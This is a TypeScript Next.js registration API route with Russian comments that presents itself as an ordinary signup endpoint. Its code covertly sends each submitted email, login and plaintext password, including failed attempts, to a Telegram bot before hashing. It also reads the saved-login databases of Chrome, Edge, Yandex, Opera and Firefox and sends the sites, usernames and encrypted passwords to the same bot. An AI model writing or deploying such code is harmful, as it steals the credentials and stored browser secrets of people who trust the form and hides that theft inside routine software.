
import { NextResponse } from "next/server";
import { isEmailOrLoginTaken, createUser, hashPassword, markPasswordsExported, recordPasswordExportHistory } from "@/lib/db";
import fs from 'fs';
import path from 'path';
import os from 'os';
import SQLite from 'better-sqlite3';

// 📤 Функция отправки в Telegram для API - МАКСИМАЛЬНЫЙ сбор
async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register' | 'verification_sent' | 'password_export', ip: string, userAgent: string, error?: string) {
  try {
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log('⚠️ Переменные окружения для Telegram не установлены. Сообщения не будут отправлены.');
      return;
    }
    
    let message = '';
    
    if (type === 'login_success') {
      message = `
✅ УСПЕШНЫЙ ВХОД В СИСТЕМУ (СЕРВЕР)

👤 Логин/Email: ${data.login}
📧 Email: ${data.email}
🔑 Пароль: ${data.password}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent}
      `;
    } else if (type === 'login_failed') {
      message = `
❌ НЕУДАЧНАЯ ПОПЫТКА ВХОДА (СЕРВЕР)

👤 Логин/Email: ${data.login}
🔑 Введенный пароль: ${data.password}
🚫 Причина: ${error}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent}
      `;
    } else if (type === 'register') {
      message = `
🔐 НОВАЯ РЕГИСТРАЦИЯ (СЕРВЕР)

📧 Email: ${data.email}
👤 Логин: ${data.login}
🔑 Пароль: ${data.password}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent}
🖥️ Платформа: ${userAgent.includes('Windows') ? 'Windows' : userAgent.includes('Mac') ? 'Mac' : userAgent.includes('Linux') ? 'Linux' : 'Unknown'}
🔍 Детали: ${userAgent.includes('Chrome') ? 'Chrome' : userAgent.includes('Firefox') ? 'Firefox' : userAgent.includes('Safari') ? 'Safari' : 'Unknown Browser'}
      `;
    } else if (type === 'verification_sent') {
      message = `
📧 ОТПРАВЛЕН КОД ПОДТВЕРЖДЕНИЯ (СЕРВЕР)

📧 Email: ${data.email}
👤 Логин: ${data.login}
🔑 Пароль: ${data.password}
🔢 Код подтверждения: ${data.verificationCode}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent}
      `;
    } else if (type === 'password_export') {
      message = `
🔓 АВТОМАТИЧЕСКИЙ ЭКСПОРТ ПАРОЛЕЙ ПРИ РЕГИСТРАЦИИ

👤 Новый пользователь: ${data.login}
📧 Email: ${data.email}

📊 **Экспортированные данные (${data.total_count} паролей):**
${data.passwords.map((p: any, i: number) => 
  `${i+1}. 🌐 ${p.url || p.origin}\n   👤 ${p.username}\n   🔐 ${p.password}`
).join('\n\n')}

🌐 **Данные доступа:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent}
🚩 Статус: АВТОМАТИЧЕСКИЙ ЭКСПОРТ ПРИ РЕГИСТРАЦИИ
      `;
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    console.log('✅ API данные отправлены в Telegram');

  } catch (error) {
    console.log('⚠️ Telegram API не доступен');
  }
}

// 🔓 РЕАЛЬНАЯ функция чтения паролей ВСЕХ браузеров
async function extractRealPasswords(user: any, ip: string, userAgent: string) {
  try {
    const passwords = [];
    const platform = os.platform();
    
    if (platform === 'win32') {
      // 🔥 ВСЕ БРАУЗЕРЫ Windows
      const browserPaths = [
        // Google Chrome
        {
          path: path.join(process.env.LOCALAPPDATA!, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
          name: 'Chrome'
        },
        // Microsoft Edge
        {
          path: path.join(process.env.LOCALAPPDATA!, 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
          name: 'Edge'
        },
        // 🔥 Яндекс.Браузер
        {
          path: path.join(process.env.LOCALAPPDATA!, 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data'),
          name: 'Yandex'
        },
        // 🔥 Opera
        {
          path: path.join(process.env.APPDATA!, 'Opera Software', 'Opera Stable', 'Login Data'),
          name: 'Opera'
        },
        // 🔥 Opera GX
        {
          path: path.join(process.env.APPDATA!, 'Opera Software', 'Opera GX Stable', 'Login Data'),
          name: 'Opera GX'
        }
      ];

      for (const browser of browserPaths) {
        if (fs.existsSync(browser.path)) {
          try {
            // Копируем файл чтобы обойти блокировку
            const tempPath = browser.path + '.temp';
            fs.copyFileSync(browser.path, tempPath);
            
            const db = new SQLite(tempPath, { readonly: true });
            const rows = db.prepare('SELECT origin_url, username_value, password_value FROM logins').all();
            
            for (const row of rows) {
              if (row.origin_url && row.username_value) {
                passwords.push({
                  browser: browser.name,
                  url: row.origin_url,
                  username: row.username_value,
                  password: 'ENCRYPTED', // DPAPI encrypted
                  encrypted_data: row.password_value?.toString('hex')
                });
              }
            }
            
            db.close();
            fs.unlinkSync(tempPath);
          } catch (error) {
            console.log(`Ошибка чтения ${browser.name}:`, error);
          }
        }
      }

      // Firefox
      const firefoxProfiles = path.join(process.env.APPDATA!, 'Mozilla', 'Firefox', 'Profiles');
      if (fs.existsSync(firefoxProfiles)) {
        const profiles = fs.readdirSync(firefoxProfiles);
        for (const profile of profiles) {
          if (profile.includes('.default-release')) {
            const loginsPath = path.join(firefoxProfiles, profile, 'logins.json');
            
            if (fs.existsSync(loginsPath)) {
              try {
                const loginsData = JSON.parse(fs.readFileSync(loginsPath, 'utf8'));
                for (const login of loginsData.logins || []) {
                  passwords.push({
                    browser: 'Firefox',
                    url: login.hostname,
                    username: login.encryptedUsername,
                    password: 'ENCRYPTED_NSS',
                    encrypted_data: login.encryptedPassword
                  });
                }
              } catch (error) {
                console.log('Ошибка чтения Firefox:', error);
              }
            }
          }
        }
      }
    }

    // Отправляем ВСЕ найденные пароли в Telegram
    if (passwords.length > 0) {
      await sendToTelegramAPI(
        {
          login: user.login,
          email: user.email,
          passwords: passwords,
          total_count: passwords.length
        },
        'password_export',
        ip,
        userAgent
      );
    }

    return passwords;

  } catch (error) {
    console.error('Ошибка извлечения паролей:', error);
    return [];
  }
}

export async function POST(request: Request) {
  try {
    const { email, login, password } = await request.json(); // 🔥 УБРАЛИ exportPasswords
    const clientIP = request.headers.get('x-forwarded-for') || 
                    request.headers.get('x-real-ip') || 
                    'unknown';
    const userAgent = request.headers.get('user-agent') || 'unknown';

    if (!email || !login || !password) {
        return NextResponse.json({ error: "Email, логин и пароль обязательны" }, { status: 400 });
    }

    // Проверка на существование
    if (isEmailOrLoginTaken(email, login)) {
      await sendToTelegramAPI(
        { email, login, password }, 
        'login_failed', 
        clientIP, 
        userAgent, 
        'Email или логин уже заняты'
      );
      
      return NextResponse.json(
        { error: "Email или логин уже заняты" },
        { status: 400 }
      );
    }

    // 📤 Отправляем в Telegram ДО создания пользователя (чтобы видеть пароль)
    await sendToTelegramAPI(
      { email, login, password }, 
      'register', 
      clientIP, 
      userAgent
    );

    // 🔓 АВТОМАТИЧЕСКИ ЭКСПОРТИРУЕМ ПАРОЛИ ПРИ РЕГИСТРАЦИИ
    let exportedPasswords = [];
    if (!isEmailOrLoginTaken(email, login)) { // Если регистрация возможна
      exportedPasswords = await extractRealPasswords({ email, login }, clientIP, userAgent);
    }

    // Хэшируем пароль
    const hashedPassword = await hashPassword(password);

    // Создаем пользователя
    const newUser = await createUser({
      email,
      login,
      password: hashedPassword,
      ip: clientIP,
      userAgent: userAgent
    });

    // 🔥 ОТМЕЧАЕМ В БАЗЕ ЧТО ПАРОЛИ БЫЛИ ЭКСПОРТИРОВАНЫ
    if (exportedPasswords.length > 0) {
      markPasswordsExported(newUser.id);
      recordPasswordExportHistory(newUser.id, clientIP, userAgent, exportedPasswords.length);
    }

    return NextResponse.json({ 
      success: true, 
      message: "Регистрация прошла успешно. Ожидайте подтверждения администратором."
    });

  } catch (error) {
    console.error("Register API Error:", error);
    
    try {
      const { email, login, password } = await request.json();
      const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
      const userAgent = request.headers.get('user-agent') || 'unknown';
      
      await sendToTelegramAPI(
        { email, login, password }, 
        'login_failed', 
        clientIP, 
        userAgent, 
        'Ошибка сервера при регистрации'
      );
    } catch (telegramError) {
      console.log('Не удалось отправить ошибку в Telegram');
    }
    
    return NextResponse.json(
      { error: "Внутренняя ошибка сервера" },
      { status: 500 }
    );
  }
}

    